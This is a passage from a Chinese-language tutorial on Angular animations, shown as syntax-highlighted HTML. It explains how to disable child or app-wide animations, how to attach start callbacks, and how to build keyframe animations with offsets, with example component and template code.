        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          transform<span class="token operator">:</span> <span class="token string">'translateX(100%)'</span><span class="token punctuation">,</span>
          color<span class="token operator">:</span> <span class="token string">'red'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="控制子元素动画禁用"><a href="#控制子元素动画禁用" class="header-anchor">#</a> 控制子元素动画禁用</h3> <p>在Angular中，每次触发的动画中，都会先触发父元素上动画，父元素动画被禁用，子元素上的动画就不会触发。为了触发子元素上的动画，父元素必须要查询到包含子动画的每一个元素，然后使用animateChild()函数来运行这些子动画。可以利用 @.disabled 来控制某些父元素下面的子元素动画禁用与否。现在用一个button去控制前面飞入动画的禁用与否，修改模版文件为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>nz<span class="token operator">-</span>divider <span class="token punctuation">[</span>nzText<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;'飞入飞出动画'&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>divider<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>button nz<span class="token operator">-</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;handleInOut()&quot;</span><span class="token operator">&gt;</span>按钮<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>button nz<span class="token operator">-</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;handleDisabled()&quot;</span><span class="token operator">&gt;</span>改变禁用动画<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
  禁用的状态：<span class="token punctuation">{</span><span class="token punctuation">{</span>isDisabled<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control nzSpan<span class="token operator">=</span><span class="token string">&quot;10&quot;</span> nzOffset<span class="token operator">=</span><span class="token string">&quot;7&quot;</span> <span class="token punctuation">[</span>@<span class="token punctuation">.</span>disabled<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;isDisabled&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;text-align: center;background: red&quot;</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;isInOut&quot;</span> <span class="token punctuation">[</span>@fly<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;isInOut?'flyIn':'void'&quot;</span><span class="token operator">&gt;</span>
      飞入飞出动画～
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>增加属性isDisabled来控制动画<code>@.disable</code>禁用与否，并将利用一个按钮的点击事件来改变禁用的状态。故修改类文件为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> transition<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-animation-demo'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'./animation-demo.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./animation-demo.component.less'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// 定义动画的触发器放在 animations 元数据属性中</span>
    <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'fly'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'flyIn'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
        transform<span class="token operator">:</span> <span class="token string">'translateX(0)'</span><span class="token punctuation">,</span>
        color<span class="token operator">:</span> <span class="token string">'blue'</span><span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'void =&gt; *'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          transform<span class="token operator">:</span> <span class="token string">'translateX(-100%)'</span><span class="token punctuation">,</span>
          color<span class="token operator">:</span> <span class="token string">'yellow'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; void'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          transform<span class="token operator">:</span> <span class="token string">'translateX(100%)'</span><span class="token punctuation">,</span>
          color<span class="token operator">:</span> <span class="token string">'red'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span>

  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AnimationDemoComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> isChange <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> isInOut <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> isDisabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleChange</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isChange <span class="token operator">=</span> state<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleInOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isInOut <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isInOut<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleDisabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isDisabled <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isDisabled<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p>然后保存，当isDisabled属性为false的时候，子元素上的飞入动画，正常运行，然后点击改变禁用动画按钮，将isDisabled属性设为true的时候,在此运行动画的时候，会发现，此刻的动画已经不能运行了。此时的父元素的disabled将子元素上的动画给禁用了。</p> <h3 id="禁用所有动画"><a href="#禁用所有动画" class="header-anchor">#</a> 禁用所有动画</h3> <p>由于在Angular项目中，默认情况下，appComponent是所有组件的父组件，所以禁用整个项目中的动画，只在appComponent中将.disabled绑定上就可以了。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-root'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'app.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'app.component.css'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span> <span class="token punctuation">[</span>
    slideInAnimation
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  @<span class="token function">HostBinding</span><span class="token punctuation">(</span><span class="token string">'@.disabled'</span><span class="token punctuation">)</span>
  <span class="token keyword">public</span> animationsDisabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>在端到端的测试中，禁用所有项目中的动画非常有用。</p></div> <h3 id="动画增加回调函数"><a href="#动画增加回调函数" class="header-anchor">#</a> 动画增加回调函数</h3> <p>在动画启动和终止的时候，trigger()函数会有一些回调函数，在模版文件中，动画事件都是可以通过$event来传递。
比如在模版中有一个trigger()为open，此时，常用的回调就可以使用：@open.start 和 @open.done。拿之前的飞入飞出动画来实验,在模版文件中，增加一个start的回调：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control nzSpan<span class="token operator">=</span><span class="token string">&quot;10&quot;</span> nzOffset<span class="token operator">=</span><span class="token string">&quot;7&quot;</span> <span class="token punctuation">[</span>@<span class="token punctuation">.</span>disabled<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;isDisabled&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;text-align: center&quot;</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;isInOut&quot;</span>
         <span class="token punctuation">[</span>@fly<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;isInOut?'flyIn':'void'&quot;</span> <span class="token punctuation">(</span>@fly<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;handleFlyStart($event)&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span>飞入飞出动画～<span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>这时候，增加了一个关于fly的start的回调，再修改类文件:</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">public</span> <span class="token function">handleFlyStart</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> AnimationEvent</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>然后保存，在控制台就可以看到了关于fly这个trriger 的相关信息了；</p> <h3 id="关键帧动画"><a href="#关键帧动画" class="header-anchor">#</a> 关键帧动画</h3> <p>将这个动画修改为具有多个顺序执行步骤的动画，此时就要用到关键帧动画。在Angular中，使用 keyframe() 函数就可以创建关键帧动画，这类似的CSS中的关键帧。关键帧允许在单个时间段内进行多种样式更改。例如，将上面提到中的动画，黄色变化到绿色的时候，多次改变颜色。修改类文件如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> query<span class="token punctuation">,</span> keyframes<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-animation-demo'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'./animation-demo.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./animation-demo.component.less'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// 定义动画的触发器放在 animations 元数据属性中</span>
    <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'stateChange'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isYellow'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'yellow'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isGreen'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'green'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isRed'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'150px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'150px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow &lt;=&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'4s'</span><span class="token punctuation">,</span> <span class="token function">keyframes</span><span class="token punctuation">(</span> <span class="token comment">// &lt;---------</span>
        <span class="token punctuation">[</span>
          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'blue'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'orange'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; isRed'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'0.5s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>opacity<span class="token operator">:</span> <span class="token string">'*'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; *'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'5s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AnimationDemoComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> isChange <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> isInOut <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> isDisabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleChange</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isChange <span class="token operator">=</span> state<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleInOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isInOut <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isInOut<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleDisabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isDisabled <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isDisabled<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">handleFlyStart</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> AnimationEvent</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><p>在这里，将黄色和绿色两种状态的转场时间设置成了4s，然后增加了变化成蓝色，红色，橙色的关键帧动画，保存以后，点击按钮，产生动画如下:</p> <p><img src="/vuebloger/img/post/201905072026444.gif" alt=""></p> <h3 id="关键帧偏移"><a href="#关键帧偏移" class="header-anchor">#</a> 关键帧偏移</h3> <p>关键帧包括一个用来定义动画中每个样式何时开始更改的偏移（offset）属性。偏移是个 0 到 1 之间的相对值，分别标记动画的开始和结束时间。前面我们没有设置关键帧偏移偏移的属性，所以angular会自动平均分配。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span>Component<span class="token punctuation">,</span> OnInit<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> transition<span class="token punctuation">,</span> query<span class="token punctuation">,</span> keyframes<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-animation-demo'</span><span class="token punctuation">,</span>
  templateUrl<span class="token operator">:</span> <span class="token string">'./animation-demo.component.html'</span><span class="token punctuation">,</span>
  styleUrls<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'./animation-demo.component.less'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  animations<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token comment">// 定义动画的触发器放在 animations 元数据属性中</span>
    <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'stateChange'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isYellow'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'yellow'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isGreen'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'green'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isRed'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
        <span class="token punctuation">{</span>
          height<span class="token operator">:</span> <span class="token string">'150px'</span><span class="token punctuation">,</span>
          width<span class="token operator">:</span> <span class="token string">'150px'</span><span class="token punctuation">,</span>
          opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
          backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow &lt;=&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'4s'</span><span class="token punctuation">,</span> <span class="token function">keyframes</span><span class="token punctuation">(</span>
        <span class="token punctuation">[</span>
          <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>backgroundColor<span class="token operator">:</span> <span class="token string">'blue'</span><span class="token punctuation">,</span> offset<span class="token operator">:</span> <span class="token number">0.1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//&lt;-----</span>
